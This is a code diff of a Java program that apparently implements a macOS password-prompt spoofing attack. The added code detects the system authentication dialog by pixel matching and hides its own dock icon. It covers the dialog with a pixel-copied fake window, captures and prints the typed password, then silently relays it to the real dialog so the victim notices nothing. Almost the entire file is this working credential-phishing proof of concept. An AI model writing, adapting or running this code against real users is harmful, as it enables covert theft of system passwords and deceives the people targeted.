@@ -1,113 +1,157 @@
 package kcap;
-
-import java.awt.AWTException;
-import java.awt.BorderLayout;
-import java.awt.Rectangle;
-import java.awt.Robot;
-import java.awt.Toolkit;
-import java.awt.event.ActionEvent;
-import java.awt.event.ActionListener;
-import java.awt.event.KeyEvent;
-import java.awt.event.WindowEvent;
-import java.awt.event.WindowFocusListener;
+import java.awt.*;
+import java.awt.event.*;
 import java.awt.image.*;
-import java.io.BufferedReader;
-import java.io.File;
-import java.io.IOException;
-import java.io.InputStreamReader;
-import java.util.Arrays;
-import java.util.concurrent.atomic.AtomicBoolean;
-import javax.imageio.ImageIO;
 import javax.swing.*;
-
 /**
- *
  * @author scriptjunkie
  */
 public class Kcap {
-
+    private static Point triggerLoc; //where they clicked to get the password prompt
+    private static final int REF_WIDTH = 64; // the width of the below pixel array
+    private static Rectangle popupRect; //The location & dimensions of the password popup
+    private static Rectangle sr; //The screen
+    private static final int[] USERPASS_PIXELS = new int[]{693, 350, 157, 682, 693, 693, 693, 511, 131, 682, 660, 307, 0, 0, 223, 628, 693, 693, 476, 52, 0, 77, 535, 693, 633, 181, 374, 0, 150, 617, 181, 412, 34, 0, 220, 642, 693, 598, 199, 0, 0, 290, 672, 685, 269, 298, 124, 0, 230, 560, 101, 0, 115, 584, 693, 693, 476, 52, 0, 77, 535, 693, 693, 501, 693, 350, 157, 682, 693, 693, 693, 511, 131, 682, 428, 64, 525, 570, 92, 267, 693, 518, 0, 360, 560, 282, 0, 583, 629, 68, 64, 451, 560, 629, 68, 77, 515, 474, 52, 350, 685, 185, 97, 562, 492, 52, 371, 680, 197, 0, 431, 480, 68, 0, 419, 521, 92, 247, 689, 518, 0, 360, 560, 282, 0, 583, 640, 68, 693, 350, 157, 682, 693, 693, 693, 511, 131, 682, 359, 64, 552, 679, 693, 678, 693, 299, 150, 658, 669, 613, 68, 483, 629, 68, 511, 693, 693, 629, 68, 511, 693, 693, 311, 200, 682, 683, 674, 669, 650, 215, 341, 680, 179, 311, 693, 693, 311, 229, 693, 693, 364, 150, 678, 299, 150, 658, 669, 613, 68, 483, 693, 572, 693, 350, 178, 682, 693, 693, 693, 457, 150, 682, 638, 235, 0, 0, 145, 557, 675, 179, 0, 0, 0, 0, 0, 350, 629, 52, 513, 693, 693, 629, 52, 513, 693, 693, 359, 150, 672, 421, 0, 0, 0, 0, 357, 680, 179, 350, 693, 693, 342, 341, 693, 693, 350, 157, 662, 179, 0, 0, 0, 0, 0, 350, 693, 693, 693, 381, 87, 660, 693, 693, 693, 299, 150, 678, 693, 693, 678, 594, 142, 150, 678, 311, 181, 685, 693, 693, 654, 679, 629, 52, 513, 693, 693, 629, 52, 513, 693, 693, 350, 157, 611, 52, 401, 689, 685, 204, 341, 680, 179, 350, 693, 693, 337, 331, 693, 693, 350, 157, 682, 311, 181, 685, 693, 693, 654, 679, 693, 693, 693, 569, 0, 231, 583, 626, 379, 0, 367, 693, 268, 87, 589, 639, 190, 181, 682, 446, 0, 404, 645, 427, 0, 529, 629, 52, 513, 693, 693, 629, 52, 513, 693, 693, 350, 150, 611, 52, 364, 621, 417, 0, 357, 680, 179, 350, 693, 693, 337, 331, 693, 693, 350, 157, 682, 446, 0, 404, 645, 427, 0, 529, 675, 236, 693, 693, 510, 68, 0, 0, 0, 356, 682, 693, 603, 138, 0, 0, 115, 556, 693, 688, 402, 0, 0, 0, 390, 689, 629, 68, 529, 693, 693, 629, 68, 529, 693, 693, 359, 181, 677, 402, 0, 0, 152, 232, 350, 680, 197, 350, 693, 693, 342, 331, 693, 693, 359, 178, 682, 688, 402, 0, 0, 0, 390, 689, 661, 142, 693, 693, 693, 688, 625, 611, 666, 693, 693, 693, 693, 693, 663, 654, 693, 693, 693, 693, 693, 678, 651, 679, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 678, 663, 689, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 678, 651, 679, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 685, 473, 418, 426, 426, 478, 667, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 535, 77, 640, 693, 693, 693, 693, 693, 693, 680, 179, 0, 0, 0, 0, 106, 654, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 518, 52, 625, 693, 693, 693, 693, 693, 693, 680, 157, 507, 693, 693, 499, 0, 392, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 693, 678, 693, 533, 52, 629, 693, 693, 693, 693, 693, 693, 680, 157, 507, 693, 693, 685, 185, 341, 693, 470, 68, 0, 34, 446, 693, 693, 453, 52, 0, 97, 508, 693, 660, 307, 0, 0, 223, 628, 376, 259, 685, 688, 305, 236, 682, 693, 333, 320, 693, 598, 158, 0, 0, 320, 678, 685, 269, 282, 115, 34, 625, 577, 115, 0, 115, 344, 64, 629, 693, 501, 693, 693, 693, 693, 680, 157, 521, 693, 693, 675, 157, 326, 619, 34, 302, 598, 364, 0, 583, 613, 34, 393, 617, 266, 77, 645, 428, 64, 525, 570, 92, 267, 472, 77, 650, 649, 92, 64, 629, 665, 110, 432, 649, 101, 152, 534, 458, 34, 259, 676, 197, 0, 353, 534, 633, 92, 152, 524, 424, 0, 64, 629, 640, 68, 693, 693, 693, 693, 680, 179, 347, 499, 471, 216, 0, 523, 693, 678, 678, 663, 588, 52, 507, 586, 0, 404, 661, 693, 678, 689, 359, 64, 552, 679, 693, 678, 623, 52, 560, 549, 34, 52, 498, 597, 0, 600, 511, 34, 614, 693, 693, 446, 87, 630, 179, 300, 693, 693, 511, 34, 614, 693, 693, 409, 64, 629, 693, 572, 693, 693, 693, 693, 680, 190, 0, 96, 34, 189, 529, 693, 650, 258, 0, 0, 0, 0, 513, 685, 389, 0, 0, 52, 430, 689, 638, 235, 0, 0, 145, 557, 685, 185, 409, 350, 335, 373, 300, 455, 123, 678, 518, 64, 629, 693, 693, 529, 52, 611, 179, 350, 693, 693, 518, 64, 629, 693, 693, 535, 52, 629, 693, 693, 693, 693, 693, 693, 680, 157, 511, 693, 693, 693, 693, 693, 440, 64, 574, 693, 619, 52, 513, 693, 693, 693, 631, 368, 0, 578, 693, 693, 678, 594, 142, 150, 678, 409, 145, 115, 527, 562, 64, 170, 350, 693, 506, 52, 625, 693, 693, 475, 52, 611, 179, 350, 693, 693, 506, 52, 625, 693, 693, 431, 64, 629, 693, 693};
+    private static BufferedImage popupImg = new BufferedImage(50, 50, BufferedImage.TYPE_INT_ARGB);
     static Robot r;
-
-    private static void writeString(String s) {
-        for (int i = 0; i < s.length(); i++) {
-            char c = s.charAt(i);
-            if (Character.isUpperCase(c)) {
-                r.keyPress(KeyEvent.VK_SHIFT);
-            }
-            r.keyPress(Character.toUpperCase(c));
-            r.keyRelease(Character.toUpperCase(c));
-
-            if (Character.isUpperCase(c)) {
-                r.keyRelease(KeyEvent.VK_SHIFT);
-            }
-        }
-        r.delay(50);
-    }
-
-    /**
-     * @param args the command line arguments
-     */
-    public static void main(String[] args) throws AWTException, IOException, InterruptedException {
+    
+    public static void main(String[] args) throws Exception {
+        //first blank our dock image. You could also swap it with finder or something, but meh, I'm lazy.
+        //Also, you don't have to use reflection to invoke this method. Unless your Java compile environment is awful like mine.
+        Object app = Class.forName("com.apple.eawt.Application").getDeclaredMethod("getApplication").invoke(null);
+        app.getClass().getMethod("setDockIconImage", Image.class).invoke(app, popupImg); //at this point, an empty image
+        
+        //Next prep our static stuff
         r = new Robot();
-        Rectangle sr = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
-        JFrame j = new JFrame();
-        j.setUndecorated(true);
-        AtomicBoolean entered = new AtomicBoolean(false);
-        JPasswordField jpf = new JPasswordField(30);
-        jpf.addActionListener(new ActionListener() {
+        sr = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
+        
+        //Java takes a while to load up the first window. We do it now, then hide it so we're ready to go later
+        JFrame spoofFrame = new JFrame();
+        JPanel pane = new JPanel() {
             @Override
-            public void actionPerformed(ActionEvent e) {
-                System.out.println("Got " + new String(jpf.getPassword()));
-                entered.set(true);
-                j.setVisible(false);
+            protected void paintComponent(Graphics g) {
+                super.paintComponent(g);
+                g.drawImage(popupImg, 0, 0, null);
             }
-        });
-        j.getContentPane().add(jpf, BorderLayout.CENTER);
-        j.pack();
-        j.setAlwaysOnTop(true);
-        j.setBounds((int) sr.getWidth() / 2 - 100,
-                (int) sr.getHeight() / 2 - 50, 200, 100);
-        j.setVisible(true);
-        //This part makes sure they stay focused on us. Probably not necessary.
-        j.addWindowFocusListener(new WindowFocusListener() {
-            @Override
-            public void windowGainedFocus(WindowEvent e) {
-            }
-
-            @Override
-            public void windowLostFocus(WindowEvent e) {
-                if (!entered.get()) {
-                    System.out.println("Focus!");
-                    j.setVisible(false);
-                    j.setVisible(true);
-                    j.toFront();
-                    System.out.println(jpf.requestFocus(true));
+        };
+        spoofFrame.setContentPane(pane);
+        spoofFrame.setUndecorated(true);
+        spoofFrame.setBounds(sr.width-10, sr.height - 10, 300, 400);
+        spoofFrame.setLayout(null);
+        JPasswordField jpass = new JPasswordField();
+        jpass.setFont(jpass.getFont().deriveFont(12.0f));
+        jpass.setColumns(30);
+        jpass.setBounds(167, 133, 258, 21);
+        pane.add(jpass);
+        spoofFrame.addMouseListener(new MouseAdapter(){
+            public void mouseClicked(MouseEvent e) {
+                if(e.getY() > 180 && e.getX() > 250){
+                    spoofFrame.setVisible(false);
+                    if(e.getX() > 340){
+                        gotPassword(jpass);
+                    }
+                    System.exit(0);
                 }
             }
         });
-
-        while (!entered.get()) {
-            Thread.sleep(100);
-        }
-
-        //Step 1: wait for the prompt
-        BufferedReader bf = new BufferedReader(new InputStreamReader(System.in));
+        jpass.addActionListener(new ActionListener(){
+            public void actionPerformed(ActionEvent e) {
+                gotPassword(jpass);
+            }
+        });
+        spoofFrame.setVisible(true);
+        
+        //Now we wait for the prompt to come up
+        Rectangle rct = new Rectangle((int) sr.getWidth() / 2 - 150, (int) sr.getHeight() / 2 - 190, 100, 100);
+        int[] capturedPixels = new int[rct.height * rct.width];
         boolean foundPrompt = false;
-        while (!foundPrompt) {
-            BufferedImage image = new Robot().createScreenCapture(sr);
-            final int[] pixels = ((DataBufferInt) image.getData(new Rectangle((int) sr.getWidth() / 2 - 100,
-                    (int) sr.getHeight() / 2 - 50, 200, 100)).getDataBuffer()).getData();
-            ImageIO.write(image, "png", new File("screenshot.png"));
-            if (Arrays.equals(pixels, new int[]{0, 1, 2, 3})) {
-                break;
+snap:   while (!foundPrompt) {
+            final int[] pixels = ((DataBufferInt) new Robot().createScreenCapture(rct).getData().getDataBuffer()).getData();
+            int offset = 0;
+            for (int pixInt : pixels) {
+                int posInt = pixInt & 0x00FFFFFF;
+                capturedPixels[offset++] = ((posInt >> 16) % 256) + ((posInt >> 8) % 256) + (posInt % 256);
             }
-            if (bf.ready()) {
-                break;
+            int idx = 0;
+            //check each line and see if you find it
+            for(int i = 0; i < USERPASS_PIXELS.length; i += REF_WIDTH){
+                idx = findPixels(capturedPixels, idx, USERPASS_PIXELS, i, REF_WIDTH);
+                if(idx == -1){
+                    spoofFrame.setVisible(false);
+                    r.delay(100);
+                    continue snap;
+                }else{
+                    idx += rct.width;
+                }
             }
-            System.out.println("...");
-            r.delay(1000);
+            break;
         }
-        //Step 2: spoof the input
+        //Step 2: spoof the input.
+        //First grab just the popup screenshot. To make it more portable, you should scan the pixels instead of using these hardcoded values.
+        //Things like the retina displays can change the pixel widths and locations of the popups.
+        popupRect = new Rectangle((int) sr.getWidth() / 2 - 222, (int) sr.getHeight() / 2 - 280, 442, 230);
+        popupImg = new Robot().createScreenCapture(popupRect);
+        //Find top of password box
+        int pwtop = 140;
+        int pixval = popupImg.getRGB(200, pwtop);
+        while((pixval & 0x00F0F0F0) == 0x00F0F0F0 && pwtop > 100){ //close enough to white
+            pixval = popupImg.getRGB(200, pwtop--);
+        }
+        jpass.setBounds(167, pwtop+1, 258, 22);
+        spoofFrame.setBounds(popupRect);
+        spoofFrame.setAlwaysOnTop(true);
+        spoofFrame.setVisible(true);
+        //get current mouse pos
+        triggerLoc = MouseInfo.getPointerInfo().getLocation();
+        //close the existing window
+        r.mouseMove((int)sr.getWidth() / 2 + 80, (int)sr.getHeight() / 2 - 75);
+        r.mousePress(InputEvent.BUTTON1_MASK);
+        r.mouseRelease(InputEvent.BUTTON1_MASK);
+        //move mouse back
+        r.mouseMove(triggerLoc.x, triggerLoc.y);
+        //Make the new frame
+        spoofFrame.setVisible(true);
+        app.getClass().getMethod("requestForeground", boolean.class).invoke(app, true); //at this point, an empty image
     }
-
+    // Saves the password (infects your box ... whatever) then pops up the original password prompt and sends it on
+    public static void gotPassword(JPasswordField jpass){
+        String pw = new String(jpass.getPassword());
+        System.out.println("Intercepted Password! Your password is:\n"+pw);
+        Point nowPos = MouseInfo.getPointerInfo().getLocation();
+        //Popup new prompt
+        r.mouseMove(triggerLoc.x, triggerLoc.y);
+        r.mousePress(InputEvent.BUTTON1_MASK);
+        r.mouseRelease(InputEvent.BUTTON1_MASK);
+        r.delay(100);
+        //Drag real prompt offscreen
+        r.mouseMove(popupRect.x + popupRect.width - 2, popupRect.y + 2);
+        r.mousePress(InputEvent.BUTTON1_MASK);
+        r.mouseMove(0,sr.height);
+        r.mouseRelease(InputEvent.BUTTON1_MASK);
+        //Type password
+        new Keyboard(r).type(pw);
+        //Drag real prompt back onscreen
+        r.mousePress(InputEvent.BUTTON1_MASK);
+        r.mouseMove(popupRect.x + popupRect.width - 2, popupRect.y + 2);
+        r.mouseRelease(InputEvent.BUTTON1_MASK);
+        //Enter!
+        r.keyPress(KeyEvent.VK_ENTER);
+        r.keyRelease(KeyEvent.VK_ENTER);
+        r.mouseMove(nowPos.x, nowPos.y);
+        System.exit(0);
+    }
+    //Finds a row of pixels in a bigger array, in a "close enough" sense.
+    public static int findPixels(int[] outerArray, int outerOffset, int[] pixArray, int smallOffset, int smallLen) {
+        for(int i = outerOffset; i < outerArray.length - smallLen+1; ++i) {
+            boolean found = true;
+            for(int j = 0; j < smallLen; j++) {
+               if (Math.abs(outerArray[i+j] - pixArray[j+smallOffset]) > 60) {
+                   found = false;
+                   break;
+               }
+            }
+            if (found) return i;
+         }
+       return -1;  
+    }
 }
